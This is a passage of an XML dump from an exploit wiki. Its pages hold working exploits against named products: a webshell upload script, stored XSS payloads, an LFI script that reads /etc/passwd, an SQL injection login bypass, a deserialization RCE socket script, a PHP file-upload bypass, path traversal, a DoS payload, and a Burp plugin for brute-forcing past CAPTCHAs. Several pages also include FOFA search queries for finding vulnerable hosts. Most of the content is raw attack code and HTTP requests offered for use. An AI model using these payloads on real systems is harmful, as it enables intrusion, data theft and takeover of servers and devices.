name=\"productStatus\"\r\n\r\n1\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data;
name=\"create\"\r\n\r\n\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB--\r\n"
session.post(reqUrl, headers=reqHead, data=reqData)

print("product name is "+randstr)
print("shell name is "+shellname)

reqUrl = url + "product.php"
data = session.get(reqUrl)

parser = BeautifulSoup(data.text, 'html.parser')
find_shell = parser.find_all('img')

for i in find_shell:
    if shellname in i.get("src"):
        print("Shell URL : " + url  + i.get("src") + "?cmd=whoami")           
&lt;/pre&gt;</text>
      <sha1>19ycqwca315kqgmtomjepo7o2rv31zg</sha1>
    </revision>
  </page>
  <page>
    <title>BlackCat CMS 1.3.6 XSS漏洞</title>
    <ns>0</ns>
    <id>1469</id>
    <revision>
      <id>1846</id>
      <timestamp>2021-04-21T10:05:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: BlackCat CMS 1.3.6 - 'Multiple' Stored Cross-Site Scripting (XSS) # Date: 04/07/2021 # Exploit Author: Ömer Hasan Durmuş # Vendor Homepage: ht..."</comment>
      <origin>1846</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="837" sha1="fpw28ohbtb30w590cyt0pim7p7d7yhb" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: BlackCat CMS 1.3.6 - 'Multiple' Stored Cross-Site Scripting (XSS)
# Date: 04/07/2021
# Exploit Author: Ömer Hasan Durmuş
# Vendor Homepage: https://blackcat-cms.org/
# Software Link: https://blackcat-cms.org/page/download.php
# Version: BlackCat CMS - 1.3.6

Step 1 : Login to admin account in http://TARGET/backend/start/index.php
Step 2 : Then click on the "Addons"
Step 3 : Click on "Create new"
Step 4 : Input "&lt;script&gt;alert(1)&lt;/script&gt;" in the field "Module / language name"
Step 5 : Update or visit new page.

Step 1 : Login to admin account in http://TARGET/backend/start/index.php
Step 2 : Then click on the "Access"
Step 3 : Click on "Manage groups"
Step 4 : Input "&lt;script&gt;alert(1)&lt;/script&gt;" in the field "Group name" and click "Add group"
Step 5 : Update or visit new page.
            
&lt;/pre&gt;</text>
      <sha1>fpw28ohbtb30w590cyt0pim7p7d7yhb</sha1>
    </revision>
  </page>
  <page>
    <title>Black Box Kvm Extender 3.4.31307 本地文件包含漏洞</title>
    <ns>0</ns>
    <id>5594</id>
    <revision>
      <id>6427</id>
      <timestamp>2021-07-07T02:50:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Black Box Kvm Extender 3.4.31307 - Local File Inclusion # Date: 05.07.2021 # Exploit Author: Ferhat Çil # Vendor Homepage: http://www.blackbox.com/ # S..."</comment>
      <origin>6427</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="828" sha1="6egjlyw0a3077ojnzzxklbcn7ik7zcx" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Black Box Kvm Extender 3.4.31307 - Local File Inclusion
# Date: 05.07.2021
# Exploit Author: Ferhat Çil
# Vendor Homepage: http://www.blackbox.com/
# Software Link: https://www.blackbox.com/en-us/products/black-box-brand-products/kvm
# Version: 3.4.31307
# Category: Webapps
# Tested on: Linux
# Description: Any user can read files from the server
# without authentication due to an existing LFI in the following path:
# http://target//cgi-bin/show?page=FilePath

import requests
import sys

if name == 'main':
    if len(sys.argv) == 3:
        url = sys.argv[1]
        payload = url + "/cgi-bin/show?page=../../../../../../" + sys.argv[2]
        r = requests.get(payload)
        print(r.text)
    else:
        print("Usage: " + sys.argv[0] + ' http://example.com/ /etc/passwd')
            
&lt;/pre&gt;</text>
      <sha1>6egjlyw0a3077ojnzzxklbcn7ik7zcx</sha1>
    </revision>
  </page>
  <page>
    <title>Blacknote 2.2.1 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>3362</id>
    <revision>
      <id>3926</id>
      <timestamp>2021-06-03T12:03:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Blacknote 2.2.1 - Denial of Service (PoC) # Date: 2021-06-02 # Author: Brian Rodríguez # Download Link: https://play.google.com/store/apps/details?id=n..."</comment>
      <origin>3926</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1022" sha1="ba5q0gnbnotsvmieoqejtooijk08kgj" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Blacknote 2.2.1 - Denial of Service (PoC)
# Date: 2021-06-02
# Author: Brian Rodríguez
# Download Link: https://play.google.com/store/apps/details?id=notepad.note.notas.notes.notizen&amp;hl=es_MX
# Version: 2.2.1
# Category: DoS (Android)

##### Vulnerability #####

BlackNote Bloc de notas is vulnerable to a DoS condition when a long list of characters is being used when creating a note:

# STEPS #
# Open the program.
# Create a new Note.
# Run the python exploit script payload.py, it will create a new payload.txt file
# Copy the content of the file "payload.txt"
# Paste the content from payload.txt twice in the new Note.
# Crashed

Successful exploitation will cause the application to stop working.

I have been able to test this exploit against Android 8.0.

##### PoC #####
--&gt; payload.py &lt;--
#!/usr/bin/env python
buffer = "\x41" * 350000

try:
    f = open("payload.txt","w")
    f.write(buffer)
    f.close()
    print ("File created")
except:
    print ("File cannot be created")
&lt;/pre&gt;</text>
      <sha1>ba5q0gnbnotsvmieoqejtooijk08kgj</sha1>
    </revision>
  </page>
  <page>
    <title>Blitar Tourism 1.0 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>1326</id>
    <revision>
      <id>1666</id>
      <timestamp>2021-04-14T09:03:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Blitar Tourism 1.0 - Authentication Bypass SQLi # Date: 13 April 2021 # Exploit Author: sigeri94 # Vendor Homepage: https://sourcecodeaplikasi.i..."</comment>
      <origin>1666</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1051" sha1="ear5wdztzmd8rpc6d59ps3380mwnoar" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Blitar Tourism 1.0 - Authentication Bypass SQLi
# Date: 13 April 2021
# Exploit Author: sigeri94
# Vendor Homepage: https://sourcecodeaplikasi.info/source-code-aplikasi-biro-travel-berbasis-web/
# Software Link: https://codeload.github.com/satndy/Aplikasi-Biro-Travel/zip/master
# Version: 1.0

POST /travel/Admin/ HTTP/1.1
Host: 192.168.186.132
Content-Length: 49
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.186.132
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.186.132/travel/Admin/
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=0nr18qfifjk2f5o4kimk5ca312
Connection: close

username=admin%27+%23&amp;password=admin&amp;Login=Log+in
&lt;/pre&gt;</text>
      <sha1>ear5wdztzmd8rpc6d59ps3380mwnoar</sha1>
    </revision>
  </page>
  <page>
    <title>BloofoxCMS 0.5.2.1 存儲型XSS</title>
    <ns>0</ns>
    <id>1293</id>
    <revision>
      <id>1621</id>
      <timestamp>2021-04-13T09:17:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; app="BloofoxCMS" &lt;/pre&gt;  ==影響版本== 0.5.1.0 -.5.2.1   ==XSS== 登錄有效的賬號，在添加文章的時候插入Payload發布，每次訪問均可觸..."</comment>
      <origin>1621</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="227" sha1="il560blz98wsqd3a0nv8gotig2g3rpg" xml:space="preserve">==FOFA==
&lt;pre&gt;
app="BloofoxCMS"
&lt;/pre&gt;

==影響版本==
0.5.1.0 -.5.2.1


==XSS==
登錄有效的賬號，在添加文章的時候插入Payload發布，每次訪問均可觸發：

&lt;pre&gt;
&lt;img src=# onerror=alert('xss')&gt;
&lt;/pre&gt;</text>
      <sha1>il560blz98wsqd3a0nv8gotig2g3rpg</sha1>
    </revision>
  </page>
  <page>
    <title>Brother BRAgent 1.38 - 'WBA Agent Client' Unquoted Service Path</title>
    <ns>0</ns>
    <id>4436</id>
    <revision>
      <id>5109</id>
      <timestamp>2021-06-16T01:35:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Brother BRAgent 1.38 - 'WBA_Agent_Client' Unquoted Service Path # Discovery by: Brian Rodriguez # Date: 14-06-2021 # Vendor Homepage: https://brother.co..."</comment>
      <origin>5109</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1192" sha1="e9yyrj7e4vwm5l7y9fgwzix6gtlimmd" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Brother BRAgent 1.38 - 'WBA_Agent_Client' Unquoted Service Path
# Discovery by: Brian Rodriguez
# Date: 14-06-2021
# Vendor Homepage: https://brother.com
# Software Link: https://support.brother.com/g/b/downloadhowto.aspx?c=us&amp;lang=en&amp;prod=ads1000w_us&amp;os=10013&amp;dlid=dlf002778_000&amp;flang=4&amp;type3=46
# Tested Version: 1.38
# Vulnerability Type: Unquoted Service Path
# Tested on: Windows 10 Enterprise 64 bits

# Step to discover Unquoted Service Path:

C:\&gt;wmic service get name,displayname,pathname,startmode |findstr /i "auto"
|findstr /i /v "c:\windows\\" |findstr /i /v """
Brother BRAgent    WBA_Agent_Client   C:\Program Files
(x86)\Brother\BRAgent\BRAgtSrv.exe   Auto

C:\&gt;sc qc WBA_Agent_Client
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: WBA_Agent_Client
        TIPO               : 10  WIN32_OWN_PROCESS
        TIPO_INICIO        : 2   AUTO_START
        CONTROL_ERROR      : 1   NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files
(x86)\Brother\BRAgent\BRAgtSrv.exe
        GRUPO_ORDEN_CARGA  :
        ETIQUETA           : 0
        NOMBRE_MOSTRAR     : Brother BRAgent
        DEPENDENCIAS       :
        NOMBRE_INICIO_SERVICIO: LocalSystem
&lt;/pre&gt;</text>
      <sha1>e9yyrj7e4vwm5l7y9fgwzix6gtlimmd</sha1>
    </revision>
  </page>
  <page>
    <title>Brother BRPrint Auditor - 'Multiple' Unquoted Service Path</title>
    <ns>0</ns>
    <id>4433</id>
    <revision>
      <id>5106</id>
      <timestamp>2021-06-16T01:33:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Brother BRPrint Auditor 3.0.7 - 'Multiple' Unquoted Service Path # Discovery by: Brian Rodriguez # Date: 14-06-2021 # Vendor Homepage: https://support.b..."</comment>
      <origin>5106</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1841" sha1="81d9zm41dori84dhddj29dofhjm9w3c" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Brother BRPrint Auditor 3.0.7 - 'Multiple' Unquoted Service Path
# Discovery by: Brian Rodriguez
# Date: 14-06-2021
# Vendor Homepage: https://support.brother.com/
# Software Links: https://support.brother.com/g/b/downloadhowto.aspx?c=us&amp;lang=en&amp;prod=dcp7060d_all&amp;os=10013&amp;dlid=dlf102753_000&amp;flang=4&amp;type3=214
# Tested Version: 3.0.7
# Vulnerability Type: Unquoted Service Path
# Tested on: Windows 10 Enterprise

# Step to discover Unquoted Service Path:

C:\&gt;wmic service get name,displayname,pathname,startmode |findstr /i "auto"
|findstr /i /v "c:\windows\\" |findstr /i /v """
BrPrAuSvc     BrAuSvc      C:\Program Files
(x86)\Brother\BRPrintAuditor\Brsvau3a.exe       Auto

Brother BRPrintAuditor Agent     BRPA_Agent   C:\Program Files
(x86)\Brother\BRPrintAuditor\BRAgtSrv.exe    Auto

C:\Users\IEUser&gt;sc qc BrAuSvc
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: BrAuSvc
        TIPO               : 10  WIN32_OWN_PROCESS
        TIPO_INICIO        : 2   AUTO_START
        CONTROL_ERROR      : 1   NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files
(x86)\Brother\BRPrintAuditor\Brsvau3a.exe
        GRUPO_ORDEN_CARGA  : BrotherSplGroup
        ETIQUETA           : 0
        NOMBRE_MOSTRAR     : BrPrAuSvc
        DEPENDENCIAS       : Spooler
        NOMBRE_INICIO_SERVICIO: LocalSystem

C:\Users\IEUser&gt;sc qc BRPA_Agent
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: BRPA_Agent
        TIPO               : 10  WIN32_OWN_PROCESS
        TIPO_INICIO        : 2   AUTO_START
        CONTROL_ERROR      : 1   NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files
(x86)\Brother\BRPrintAuditor\BRAgtSrv.exe
        GRUPO_ORDEN_CARGA  :
        ETIQUETA           : 0
        NOMBRE_MOSTRAR     : Brother BRPrintAuditor Agent
        DEPENDENCIAS       :
        NOMBRE_INICIO_SERVICIO: LocalSystem
&lt;/pre&gt;</text>
      <sha1>81d9zm41dori84dhddj29dofhjm9w3c</sha1>
    </revision>
  </page>
  <page>
    <title>Burpsuite驗證碼識別插件xp CAPTCHA</title>
    <ns>0</ns>
    <id>50</id>
    <revision>
      <id>108</id>
      <timestamp>2021-03-01T03:54:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==程序原理== 調用http://www.kuaishibie.cn的網址驗證碼識別接口。  ==使用教程==                  [[Category:滲透測試文檔]] Category:工…」的新頁面</comment>
      <origin>108</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="173" sha1="4e675hmqzu90b3hol7ws39ppjtkb36r" xml:space="preserve">==程序原理==
調用http://www.kuaishibie.cn的網址驗證碼識別接口。

==使用教程==

















[[Category:滲透測試文檔]]
[[Category:工具分享]]</text>
      <sha1>4e675hmqzu90b3hol7ws39ppjtkb36r</sha1>
    </revision>
    <revision>
      <id>111</id>
      <parentid>108</parentid>
      <timestamp>2021-03-01T03:59:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>111</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="656" sha1="9es98x52he25r3x43uw1k3k28mqyhu7" xml:space="preserve">==程序原理==
調用http://www.kuaishibie.cn的網址驗證碼識別接口。
==使用教程==

* 導入插件；
* Attack type處選擇 Pitchfork,在http頭部位置插入配置信息,選中需要跑字段和驗證碼；
* 配置詳情：
&lt;pre&gt;
http://www.kuaishibie.cn 註冊帳號；
在http header填寫以下信息：
xiapao:帳號，密碼，驗證碼url，驗證碼類型
驗證碼類型：純數字=1，純英文=2，數字英文混合=3
如：
xiapao:test,123456,http://www.xxx.coom/get-validate-code,3
&lt;/pre&gt;
* &gt;[[檔案:600edb3d8331e.png|縮圖]][[檔案:600efaa4375be.png|縮圖]]



[[Category:滲透測試文檔]]
[[Category:工具分享]]</text>
      <sha1>9es98x52he25r3x43uw1k3k28mqyhu7</sha1>
    </revision>
    <revision>
      <id>118</id>
      <parentid>111</parentid>
      <timestamp>2021-03-01T04:08:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* 使用教程 */</comment>
      <origin>118</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1099" sha1="ll66vqxvmv25rhx7dv5yqdbfu80z5hl" xml:space="preserve">==程序原理==
調用http://www.kuaishibie.cn的網址驗證碼識別接口。
==使用教程==

* 導入插件；
* Attack type處選擇 Pitchfork,在http頭部位置插入配置信息,選中需要跑字段和驗證碼；
[[檔案:600edb3d8331e.png]]
[[檔案:600efaa4375be.png]]
* 配置詳情：
&lt;pre&gt;
http://www.kuaishibie.cn 註冊帳號；
在http header填寫以下信息：
xiapao:帳號，密碼，驗證碼url，驗證碼類型
驗證碼類型：純數字=1，純英文=2，數字英文混合=3
如：
xiapao:test,123456,http://www.xxx.coom/get-validate-code,3
&lt;/pre&gt;
[[檔案:600ee04b44979.png]]
[[檔案:600efb371b7b7.png]]
*導入字典：
[[檔案:600edf10c571c.png]]
[[檔案:600edf2b2ce28.png]]
[[檔案:600edf49e0684.png]]
*運行：
[[檔案:600efc8944640.png]]

==注意事項==
*使用默認線程跑是正常的，但是如果出現驗證碼失效或者不對的問題，可以調成單線程試試
*數據包一定要帶cookie 

==Github==
https://github.com/smxiazi/xp_CAPTCHA

==參考==
http://www.nmd5.com/?p=628

[[Category:滲透測試文檔]]
[[Category:工具分享]]</text>
      <sha1>ll66vqxvmv25rhx7dv5yqdbfu80z5hl</sha1>
    </revision>
  </page>
  <page>
    <title>C-Lodop打印機任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>2549</id>
    <revision>
      <id>3047</id>
      <timestamp>2021-05-22T02:42:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; title="C-Lodop" &lt;/pre&gt;  ==POC== &lt;pre&gt; GET /../../../../../../../../windows/System32/drivers/etc/HOSTS HTTP/1.1 Host: 127.0.0.1 .... &lt;/pre&gt;"</comment>
      <origin>3047</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="153" sha1="mhivsonyln1w51370cbg13li3k6wpts" xml:space="preserve">==FOFA==
&lt;pre&gt;
title="C-Lodop"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
GET /../../../../../../../../windows/System32/drivers/etc/HOSTS HTTP/1.1
Host: 127.0.0.1
....
&lt;/pre&gt;</text>
      <sha1>mhivsonyln1w51370cbg13li3k6wpts</sha1>
    </revision>
  </page>
  <page>
    <title>CA Release Automation NiMi 6.5 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1206</id>
    <revision>
      <id>1511</id>
      <timestamp>2021-04-11T01:24:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: CA Release Automation NiMi 6.5 - Remote Command Execution # Date: 2016-06-23 # Exploit Authors: Jakub Palaczynski, Maciej Grabiec # Vendor Homep..."</comment>
      <origin>1511</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2193" sha1="1t0alnqve79cypodf7j62qydbnqdr03" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: CA Release Automation NiMi 6.5 - Remote Command Execution
# Date: 2016-06-23
# Exploit Authors: Jakub Palaczynski, Maciej Grabiec
# Vendor Homepage: http://www.ca.com/
# Software Link: https://docops.ca.com/ca-release-automation/5-5-2/en/installation/deploy-agents/
# Version: CA Release Automation (NiMi) 5.X, 6.3, 6.4, 6.5
# CVE: CVE-2018-15691
# Info: CA Release Automation (NiMi) Remote Command Execution via Deserialization
# Info: Payloads generated using CommonsCollections1 from ysoserial work correctly.
# Info: Proof of Concept exploits NiMi service if security is turned off.
 
#!/usr/bin/python
 
import socket
import sys
import struct
 
if len(sys.argv) &lt; 4:
    sys.stderr.write("[-]Usage: python %s &lt;ip&gt; &lt;port&gt; &lt;payload_file&gt; &lt;target_nodeid - not mandatory&gt;\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 10.0.0.1 6600 /tmp/payload.bin\n" % sys.argv[0])
    exit(1)
 
host = sys.argv[1]
port = sys.argv[2]
file = sys.argv[3]
 
# check if payload does not exceed specified value
payloadObj = open(file,'rb').read()
if len(payloadObj) &gt; 5729:
    print 'Payload must be less than 5730 bytes. Try another one.'
    exit(1)
 
# open socket to nimi port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Connecting to node.'
sock.connect((host, int(port)))
 
# say hello to nimi
sock.recv(256)
sock.send('\x00\x00\x00\x0c\x0a\x04\x6e\x6f\x64\x65\x10\x0a\x72\x02\x08\x00') # first required message
 
# get Node ID
data = sock.recv(256)
name = data[5] + data[6:6+ord(data[5])]
if len(sys.argv) == 5:
    name = struct.pack("&gt;B", len(sys.argv[4])) + sys.argv[4]
 
# check if security is enabled
sock.send('\x00\x00\x00\x1a\x0a\x04\x6e\x6f\x64\x65\x10\x0a\x7a\x10\x0a\x0c\x0a\x07\x30\x2e\x30\x2e\x30\x2e\x30\x10\x94\x3c\x10\x00') # second required message
check = sock.recv(256)
if check == "":
    print 'Security is enabled. Sorry.'
    exit(1)
 
# send payload
print 'Sending payload.'
header = '\x0a\x04\x6e\x6f\x64\x65\x10\x01\x1a' + name + '\x2a\xe4\x2c\x0a\xe1\x2c'
stage = header + payloadObj + '\x90' * (5729-len(payloadObj))
payload = struct.pack("&gt;I", len(stage)) + stage
 
sock.sendall(payload)
sock.close()

&lt;/pre&gt;</text>
      <sha1>1t0alnqve79cypodf7j62qydbnqdr03</sha1>
    </revision>
  </page>
  <page>
    <title>CCLive在線客服 任意文件上傳漏洞</title>
    <ns>0</ns>
    <id>3092</id>
    <revision>
      <id>3592</id>
      <timestamp>2021-05-27T07:06:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; title="CCLive在线客服系统" &lt;/pre&gt;  ==漏洞利用== 訪問URL進入在線客服頁面，然後從圖片上傳處進行抓包 &lt;pre&gt; /index/index/home?visit..."</comment>
      <origin>3592</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1717" sha1="dz0tb4rjvo1eenebe2pkk7gy20ze4hz" xml:space="preserve">==FOFA==
&lt;pre&gt;
title="CCLive在线客服系统"
&lt;/pre&gt;

==漏洞利用==
訪問URL進入在線客服頁面，然後從圖片上傳處進行抓包
&lt;pre&gt;
/index/index/home?visiter_id=&amp;visiter_name=&amp;avatar=&amp;business_id=1&amp;groupid=0&amp;special=1 
&lt;/pre&gt;

將png後綴修改為php,以這樣的方式來繞過前端驗證:
&lt;pre&gt;
POST /admin/event/uploadimg HTTP/1.1
Host: url
Cookie: PHPSESSID=utrvj3a4vmncvmiaknccmt17nr
Content-Length: 721
Accept: application/json, text/javascript, */*; q=0.01
Origin: url
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWvBQTUlpjNAdVfUt
Referer: url/index/index?code=v9zzfNPShXGiImqm%2BjTb52DPR%2B%2BcnjEIFN4Q%2BfnbLgkNxmOgGDfmOzNSL49%2B0SCZHhjvyJZc%2BNPFyOv33HNisSF5hkaZW0w4QFZkqCzXmWx9Bi0GXxAdBo0MVIuqTye2XlFYUQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Connection: close
------WebKitFormBoundaryWvBQTUlpjNAdVfUt
Content-Disposition: form-data; name="editormd-image-file"; filename="1.jpg.php"
Content-Type: image/png
text
------WebKitFormBoundaryWvBQTUlpjNAdVfUt
Content-Disposition: form-data; name="visiter_id"
YKs5EmtR
------WebKitFormBoundaryWvBQTUlpjNAdVfUt
Content-Disposition: form-data; name="business_id"
zzcc520
------WebKitFormBoundaryWvBQTUlpjNAdVfUt
Content-Disposition: form-data; name="avatar"
/assets/images/index/avatar-red2.png
------WebKitFormBoundaryWvBQTUlpjNAdVfUt
Content-Disposition: form-data; name="record"
------WebKitFormBoundaryWvBQTUlpjNAdVfUt
Content-Disposition: form-data; name="service_id"
13
------WebKitFormBoundaryWvBQTUlpjNAdVfUt--
&lt;/pre&gt;</text>
      <sha1>dz0tb4rjvo1eenebe2pkk7gy20ze4hz</sha1>
    </revision>
  </page>
  <page>
    <title>CHIYU IoT devices XSS漏洞</title>
    <ns>0</ns>
    <id>3328</id>
    <revision>
      <id>3886</id>
      <timestamp>2021-06-02T01:12:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: CHIYU IoT devices - 'Multiple' Cross-Site Scripting (XSS) # Date: May 31 2021 # Exploit Author: sirpedrotavares # Vendor Homepage: https://www.c..."</comment>
      <origin>3886</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8009" sha1="0ix3fqvpifsh0dyuefv64uatt2u57x6" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: CHIYU IoT devices - 'Multiple' Cross-Site Scripting (XSS)
# Date: May 31 2021
# Exploit Author: sirpedrotavares
# Vendor Homepage: https://www.chiyu-tech.com/msg/msg88.html
# Software Link: https://www.chiyu-tech.com/category-hardware.html
# Version: BF-430,  BF-431,  BF-450M,  BF-630, BF631-W, BF830-W, Webpass, BF-MINI-W, and SEMAC - all firmware versions &lt; June 2021
# Tested on: BF-430,  BF-431,  BF-450M,  BF-630, BF631-W, BF830-W, Webpass, BF-MINI-W, and SEMAC
# CVE:  CVE-2021-31250 / CVE-2021-31641 / CVE-2021-31643
# Publication: https://seguranca-informatica.pt/dancing-in-the-iot-chiyu-devices-vulnerable-to-remote-attacks

Description: Several versions and models of CHIYU IoT devices are vulnerable to multiple Cross-Site Scripting flaws.

#1:  Multiple stored XSS in CHIYU BF-430, BF-431, and BF-450M IP converter devices
CVE ID: CVE-2021-31250
CVSS: Medium – CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N
URL: https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31250

============= PoC 01 ===============
Affected parameter: TF_submask
Component: if.cgi
Payload: "&gt;&lt;script&gt;alert(123)&lt;/script&gt;

HTTP Request:
GET
/if.cgi?redirect=setting.htm&amp;failure=fail.htm&amp;type=ap_tcps_apply&amp;TF_ip=443&amp;TF_submask=0&amp;TF_submask=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&amp;radio_ping_block=0&amp;max_tcp=3&amp;B_apply=APPLY
HTTP/1.1
Host: 192.168.187.12
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.187.12/ap_tcps.htm
Authorization: Basic OmFkbWlu
Connection: close
Upgrade-Insecure-Requests: 1


Steps to reproduce:
  1. Navigate to the vulnerable device
  2. Make a GET request to component mentioned (if.cgi)
  3. Append the payload at the end of the vulnerable parameter (TF_submask)
  4. Submit the request and observe payload execution

  ============= PoC 02 ===============
Affected parameter: TF_hostname=Component: dhcpc.cgi
Payload: /"&gt;&lt;img src="#"&gt;
HTTP request and response:

HTTP Request:
GET
/dhcpc.cgi?redirect=setting.htm&amp;failure=fail.htm&amp;type=dhcpc_apply&amp;TF_hostname=%2F%22%3E%3Cimg+src%3D%22%23%22&amp;S_type=2&amp;S_baud=3&amp;S_userdefine=0&amp;AP_type=0&amp;TF_port=443&amp;TF_remoteip1=%2F%22%3E%3Cimg+src%3D%22%23%22%3E&amp;B_apply=APPLY
HTTP/1.1
Host: 192.168.187.12
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.187.12/wan_dc.htm
Authorization: Basic OmFkbWlu
Connection: close
Upgrade-Insecure-Requests: 1


Steps to reproduce:
  1. Navigate to the vulnerable device
  2. Make a GET request to component mentioned (dhcpc.cgi)
  3. Append the payload at the end of the vulnerable parameter (TF_hostname)
  4. Submit the request and observe payload execution

  ============= PoC 03 ===============
Affected parameter: TF_servicename=Component: ppp.cgi
Payload: "&gt;&lt;script&gt;alert(123)&lt;/script&gt;

GET
/ppp.cgi?redirect=setting.htm&amp;failure=fail.htm&amp;type=ppp_apply&amp;TF_username=admin&amp;TF_password=admin&amp;TF_servicename=%22%3E%3Cscript%3Ealert%28%27123%27%29%3B%3C%2Fscript%3E&amp;TF_idletime=0&amp;L_ipnego=DISABLE&amp;TF_fixip1=&amp;TF_fixip2=&amp;TF_fixip3=&amp;TF_fixip4=&amp;S_type=2&amp;S_baud=3&amp;S_userdefine=0&amp;AP_type=0&amp;TF_port=443&amp;TF_remoteip1=0.0.0.0&amp;B_apply=APPLY
HTTP/1.1
Host: 192.168.187.143
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.187.143/wan_pe.htm
Authorization: Basic OmFkbWlu
Connection: close
Upgrade-Insecure-Requests: 1


Steps to reproduce:
  1. Navigate to the vulnerable device
  2. Make a GET request to component mentioned (ppp.cgi)
  3. Append the payload at the end of the vulnerable parameter
(TF_servicename)
  4. Submit the request and observe payload execution

============= PoC 04 ===============
